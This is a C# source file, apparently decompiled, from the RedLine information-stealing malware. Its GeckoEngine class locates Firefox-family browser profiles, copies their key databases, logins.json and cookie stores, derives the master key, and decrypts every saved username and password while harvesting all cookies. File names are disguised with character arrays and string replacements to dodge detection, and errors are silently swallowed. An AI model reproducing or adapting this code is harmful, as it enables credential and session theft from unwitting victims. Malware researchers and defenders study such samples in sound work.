using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using RedLine.Client.Models.Gecko;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Browsers;
using RedLine.Reburn.Models.Gecko;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Browsers.Gecko;

public static class GeckoEngine
{
	public static List<Browser> ParseBrowsers(IList<string> paths)
	{
		List<Browser> list = new List<Browser>();
		try
		{
			foreach (string path in paths)
			{
				try
				{
					string fullName = new FileInfo(path).Directory!.FullName;
					string text = (path.Contains(Constants.RoamingAppData) ? GetRoamingName(fullName) : GetLocalName(fullName));
					if (!string.IsNullOrEmpty(text))
					{
						List<LoginPair> value = EnumPasswords(fullName);
						Browser item = new Browser
						{
							Name = text,
							Profile = new DirectoryInfo(fullName).Name,
							Cookies = new List<Cookie>(EnumCook(fullName)).IsNull(),
							Credentials = new List<LoginPair>(value.IsNull()),
							Autofills = new List<Autofill>(),
							CreditCards = new List<CreditCard>()
						};
						list.Add(item);
					}
				}
				catch
				{
				}
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<LoginPair> EnumPasswords(string profile)
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			if (File.Exists(Path.Combine(profile, "keyabd.q3.db".Replace("abd.q", string.Empty))))
			{
				bool createdNew;
				string text = FileSystemHelper.TryCreateTemp(Path.Combine(profile, "keyabd.q3.db".Replace("abd.q", string.Empty)), out createdNew);
				list.AddRange(ParseLogins(profile, GetPrivate4Key(text)));
				if (createdNew)
				{
					File.Delete(text);
				}
			}
			if (File.Exists(Path.Combine(profile, "keyabd.q4.db".Replace("abd.q", string.Empty))))
			{
				bool createdNew2;
				string text2 = FileSystemHelper.TryCreateTemp(Path.Combine(profile, "keyabd.q4.db".Replace("abd.q", string.Empty)), out createdNew2);
				list.AddRange(ParseLogins(profile, GetPrivate4Key(text2)));
				if (createdNew2)
				{
					File.Delete(text2);
					return list;
				}
				return list;
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<LoginPair> ParseLogins(string profile, byte[] privateKey)
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			if (!File.Exists(Path.Combine(profile, new string(new char[11]
			{
				'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o',
				'n'
			}))))
			{
				return list;
			}
			bool createdNew;
			string path = FileSystemHelper.TryCreateTemp(Path.Combine(profile, new string(new char[11]
			{
				'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o',
				'n'
			})), out createdNew);
			foreach (Login login in File.ReadAllText(path).FromJSON<Logins>().logins)
			{
				Asn1Object asn1Object = Asn1Factory.Create(Convert.FromBase64String(login.encryptedUsername));
				Asn1Object asn1Object2 = Asn1Factory.Create(Convert.FromBase64String(login.encryptedPassword));
				string text = Regex.Replace(CryptoHelper.Decrypt3DES(privateKey, asn1Object.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), new string(new char[16]
				{
					'[', '^', '\\', 'u', '0', '0', '2', '0', '-', '\\',
					'u', '0', '0', '7', 'F', ']'
				}), string.Empty);
				string text2 = Regex.Replace(CryptoHelper.Decrypt3DES(privateKey, asn1Object2.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), new string(new char[16]
				{
					'[', '^', '\\', 'u', '0', '0', '2', '0', '-', '\\',
					'u', '0', '0', '7', 'F', ']'
				}), string.Empty);
				LoginPair loginPair = new LoginPair
				{
					Host = (string.IsNullOrEmpty(login.hostname) ? "UNKNOWN" : login.hostname),
					Login = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
					Password = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
				};
				if (loginPair.Login != "UNKNOWN" && loginPair.Password != "UNKNOWN" && loginPair.Host != "UNKNOWN")
				{
					list.Add(loginPair);
				}
			}
			if (createdNew)
			{
				File.Delete(path);
				return list;
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static byte[] GetPrivate4Key(string file)
	{
		byte[] result = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return result;
			}
			WindowsForm windowsForm = new WindowsForm(file);
			windowsForm.ReadTable("metaData");
			string s = windowsForm.ParseValue(0, "item1");
			string s2 = windowsForm.ParseValue(0, "item2)");
			Asn1Object asn1Object = Asn1Factory.Create(Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(s2));
			byte[] objectData = asn1Object.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			byte[] objectData2 = asn1Object.Objects[0].Objects[1].ObjectData;
			GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(s), Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(string.Empty), objectData);
			geckoPasswordBasedEncryption.Init();
			CryptoHelper.Decrypt3DES(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2);
			windowsForm.ReadTable("nssPrivate");
			int rowLength = windowsForm.RowLength;
			string s3 = string.Empty;
			for (int i = 0; i < rowLength; i++)
			{
				if (windowsForm.ParseValue(i, "a102") == Encoding.GetEncoding(new string(new char[12]
				{
					'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
					'5', '1'
				})).GetString(Constants.Key4MagicNumber))
				{
					s3 = windowsForm.ParseValue(i, "a11");
					break;
				}
			}
			Asn1Object asn1Object2 = Asn1Factory.Create(Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(s3));
			objectData = asn1Object2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			objectData2 = asn1Object2.Objects[0].Objects[1].ObjectData;
			geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(s), Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(string.Empty), objectData);
			geckoPasswordBasedEncryption.Init();
			result = Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(CryptoHelper.Decrypt3DES(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2, PaddingMode.PKCS7));
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static byte[] GetPrivate3Key(string file)
	{
		byte[] array = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return array;
			}
			GeckoDatabase berkeleyDB = new GeckoDatabase(file);
			PasswordCheck passwordCheck = new PasswordCheck(ParseDb(berkeleyDB, (string x) => x.Equals(new string(new char[14]
			{
				'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '-', 'c',
				'h', 'e', 'c', 'k'
			}))));
			string hexString = ParseDb(berkeleyDB, (string x) => x.Equals(new string(new char[11]
			{
				'g', 'l', 'o', 'b', 'a', 'l', '-', 's', 'a', 'l',
				't'
			})));
			GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(CryptoHelper.ConvertHexStringToByteArray(hexString), Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(string.Empty), CryptoHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
			geckoPasswordBasedEncryption.Init();
			CryptoHelper.Decrypt3DES(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, CryptoHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
			Asn1Object asn1Object = Asn1Factory.Create(CryptoHelper.ConvertHexStringToByteArray(ParseDb(berkeleyDB, (string x) => !x.Equals(new string(new char[14]
			{
				'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '-', 'c',
				'h', 'e', 'c', 'k'
			})) && !x.Equals(new string(new char[7] { 'V', 'e', 'r', 's', 'i', 'o', 'n' })) && !x.Equals(new string(new char[11]
			{
				'g', 'l', 'o', 'b', 'a', 'l', '-', 's', 'a', 'l',
				't'
			})))));
			GeckoPasswordBasedEncryption geckoPasswordBasedEncryption2 = new GeckoPasswordBasedEncryption(CryptoHelper.ConvertHexStringToByteArray(hexString), Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(string.Empty), asn1Object.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
			geckoPasswordBasedEncryption2.Init();
			Asn1Object asn1Object2 = Asn1Factory.Create(Asn1Factory.Create(Encoding.GetEncoding(new string(new char[12]
			{
				'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
				'5', '1'
			})).GetBytes(CryptoHelper.Decrypt3DES(geckoPasswordBasedEncryption2.DataKey, geckoPasswordBasedEncryption2.DataIV, asn1Object.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
			if (asn1Object2.Objects[0].Objects[3].ObjectData.Length > 24)
			{
				Array.Copy(asn1Object2.Objects[0].Objects[3].ObjectData, asn1Object2.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
				return array;
			}
			array = asn1Object2.Objects[0].Objects[3].ObjectData;
			return array;
		}
		catch
		{
			return array;
		}
	}

	private static string ParseDb(GeckoDatabase berkeleyDB, Func<string, bool> predicate)
	{
		string text = string.Empty;
		try
		{
			foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
			{
				if (predicate(key.Key))
				{
					text = key.Value;
				}
			}
		}
		catch
		{
		}
		return text.Replace("-", string.Empty);
	}

	private static List<Cookie> EnumCook(string profile)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			string text = Path.Combine(profile, new string(new char[14]
			{
				'c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q',
				'l', 'i', 't', 'e'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			bool createdNew;
			string text2 = FileSystemHelper.TryCreateTemp(text, out createdNew);
			WindowsForm windowsForm = new WindowsForm(text2);
			windowsForm.ReadTable(new string(new char[11]
			{
				'm', 'o', 'z', '_', 'c', 'o', 'o', 'k', 'i', 'e',
				's'
			}));
			for (int i = 0; i < windowsForm.RowLength; i++)
			{
				Cookie cookie = null;
				try
				{
					Cookie cookie2 = new Cookie();
					cookie2.Host = windowsForm.ParseValue(i, new string(new char[4] { 'h', 'o', 's', 't' })).Trim();
					cookie2.Http = windowsForm.ParseValue(i, new string(new char[4] { 'h', 'o', 's', 't' })).Trim().StartsWith(".");
					cookie2.Path = windowsForm.ParseValue(i, new string(new char[4] { 'p', 'a', 't', 'h' })).Trim();
					cookie2.Secure = windowsForm.ParseValue(i, new string(new char[8] { 'i', 's', 'S', 'e', 'c', 'u', 'r', 'e' })).StartsWith("1");
					cookie2.Expires = long.Parse(windowsForm.ParseValue(i, new string(new char[6] { 'e', 'x', 'p', 'i', 'r', 'y' })).Trim());
					cookie2.Name = windowsForm.ParseValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim();
					cookie2.Value = windowsForm.ParseValue(i, new string(new char[5] { 'v', 'a', 'l', 'u', 'e' }));
					cookie = cookie2;
				}
				catch
				{
				}
				if (cookie != null)
				{
					list.Add(cookie);
				}
			}
			if (createdNew)
			{
				File.Delete(text2);
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static string GetRoamingName(string profilesDirectory)
	{
		string text = string.Empty;
		try
		{
			string[] array = profilesDirectory.Split(new string[1]
			{
				new string(new char[16]
				{
					'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'R', 'o',
					'a', 'm', 'i', 'n', 'g', '\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', 's' }))) ? array[0] : array[1]);
		}
		catch
		{
		}
		return text.Replace(" ", string.Empty);
	}

	private static string GetLocalName(string profilesDirectory)
	{
		string text = string.Empty;
		try
		{
			string[] array = profilesDirectory.Split(new string[1]
			{
				new string(new char[14]
				{
					'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'L', 'o',
					'c', 'a', 'l', '\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', 's' }))) ? array[0] : array[1]);
		}
		catch
		{
		}
		return text.Replace(" ", string.Empty);
	}
}
